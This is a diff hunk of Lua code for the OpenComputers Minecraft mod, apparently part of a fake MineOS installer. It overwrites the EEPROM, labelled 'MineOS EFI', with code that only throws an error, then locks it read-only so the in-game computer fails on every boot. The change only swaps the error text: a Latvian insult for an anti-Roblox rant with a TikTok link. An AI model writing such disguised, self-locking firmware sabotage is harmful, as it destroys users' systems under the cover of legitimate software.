@@ -64,7 +64,9 @@ pcall(function()
   ef.setLabel("MineOS EFI")
   -- Make it so when the user reboots their OpenComputer, it will error
   ef.set([[
-    error("Ej izlabo savu 2 latviešu valodā") -- un arī matemātikā
+    -- Minecraft ir labāks lol
+    -- 1v1 me on hypixel duels
+    error("Roblox, tu maksāsi par to, ka tu izdzēsi latviešu Roblox kontus\nhttps://vm.tiktok.com/ZMNjQat4p/?k=1\nPaldies, Roblox! Visi tevi ienīst! Lol\nP.S. Salabo savu 2 latviešu valodā!!") -- un arī matemātikā
   ]])
       
   ef.makeReadonly(ef.getChecksum())
